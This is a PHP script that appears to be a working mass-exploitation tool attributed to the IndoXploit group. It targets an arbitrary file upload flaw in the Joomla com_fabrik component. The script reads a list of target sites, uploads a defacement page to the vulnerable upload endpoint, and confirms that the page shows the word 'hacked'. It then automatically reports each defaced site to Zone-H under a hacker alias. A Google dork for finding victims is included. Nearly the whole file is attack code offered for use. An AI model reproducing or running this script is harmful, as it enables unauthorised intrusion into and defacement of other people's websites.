<?php

/**

Joomla Component com_fabrik Arbitrary File Upload
Author: Et04 & bL@cKID

Google Dork
inurl:/index.php?option=com_fabrik

Auto Exploiter (Auto Upload & Auto Submit Zone-H)
Coded by: L0c4lh34rtz - IndoXploit
*/

Class IDX_Fabrik {
	public $url;

	/* File deface anda dalam folder yang sama dengan tools ini */
	private $file = "index.htm";

	/* Nick Hacker Kalian / Nick Zone -H Kalian */
	/* Pastikan dalam script deface kalian terdapat kata HACKED */
	public $hacker  = "Mr-Cakil"; 

	public function __construct() {
		if(!file_exists(getcwd()."/".$this->file)) die("!! File ".$this->file." tidak ditemukan !!");
	}

	public function validUrl() {
		if(!preg_match("/^http:\/\//", $this->url) AND !preg_match("/^https:\/\//", $this->url)) {
			$url = "http://".$this->url;
			return $url;
		} else {
			return $this->url;
		}
	}

	public function curl($url, $data = null, $headers = null, $cookie = true) {
		$ch = curl_init();
			  curl_setopt($ch, CURLOPT_RETURNTRANSFER, TRUE);
			  curl_setopt($ch, CURLOPT_URL, $url);
			  curl_setopt($ch, CURLOPT_USERAGENT, "IndoXploitTools/1.1");
			  //curl_setopt($ch, CURLOPT_VERBOSE, TRUE);
			  curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, FALSE);
			  curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, FALSE);
			  curl_setopt($ch, CURLOPT_CONNECTTIMEOUT, 5);
			  curl_setopt($ch, CURLOPT_TIMEOUT, 5);

		if($data !== null) {
			  curl_setopt($ch, CURLOPT_CUSTOMREQUEST, "POST");
			  curl_setopt($ch, CURLOPT_POST, TRUE);
			  curl_setopt($ch, CURLOPT_POSTFIELDS, $data);
		}

		if($headers !== null) {
			  curl_setopt($ch, CURLOPT_HTTPHEADER, $headers);
		}

		if($cookie === true) {
			  curl_setopt($ch, CURLOPT_COOKIE, TRUE);
			  curl_setopt($ch, CURLOPT_COOKIEFILE, "cookie.txt");
			  curl_setopt($ch, CURLOPT_COOKIEJAR, "cookie.txt");
		}

		$exec = curl_exec($ch);
		$info = curl_getinfo($ch);

			  curl_close($ch);

		return (object) [
			"response" 	=> $exec,
			"info"		=> $info
		];

	}

	public function exploit() {
		$url  = $this->url."/index.php?option=com_fabrik&format=raw&task=plugin.pluginAjax&plugin=fileupload&method=ajax_upload";
		//$post = $this->curl($url, ["file" => "@L0c.htm"], null, false);
		$post = @shell_exec("curl --silent --connect-timeout 5 -X POST -F \"file=@".$this->file."\" \"$url\"");
		$result = (object) json_decode($post, true);

		if(isset($result->error)) {
			print "[-] ".parse_url($this->url, PHP_URL_HOST)." [FAILED]\n";
		} else {
			if(isset($result->uri)) {
				if(preg_match("/hacked/i", $this->curl($result->uri)->response)) {
					print "[+] ".$result->uri." [OK]\n";
					$this->zoneh($result->uri);
					$this->save($result->uri);
				}
			}
		}
	}

	public function zoneh($url) {
		$post = $this->curl("http://www.zone-h.com/notify/single", "defacer=".$this->hacker."&domain1=$url&hackmode=1&reason=1&submit=Send",null,false);
		if(preg_match("/color=\"red\">(.*?)<\/font><\/li>/i", $post->response, $matches)) {
			if($matches[1] === "ERROR") {
				preg_match("/<font color=\"red\">ERROR:<br\/>(.*?)<br\/>/i", $post->response, $matches2);
				print "[-] Zone-H ($url) [ERROR: ".$matches2[1]."]\n\n";
			} else {
				print "[+] Zone-H ($url) [OK]\n\n";
			}
		}
	}

	public function save($isi) {
		$handle = fopen("result_fabrik.txt", "a+");
		fwrite($handle, "$isi\n");
		fclose($handle);
	}

}

$fabrik = new IDX_Fabrik();

if(!isset($argv[1])) die("!! Usage: php ".$argv[0]." target.txt");
if(!file_exists($argv[1])) die("!! File target ".$argv[1]." tidak di temukan!!");
$open = explode("\n", file_get_contents($argv[1]));

foreach($open as $list) {
	$fabrik->url = trim($list);
	$fabrik->url = $fabrik->validUrl();

	print "[*] Exploiting ".parse_url($fabrik->url, PHP_URL_HOST)."\n";
	$fabrik->exploit();
}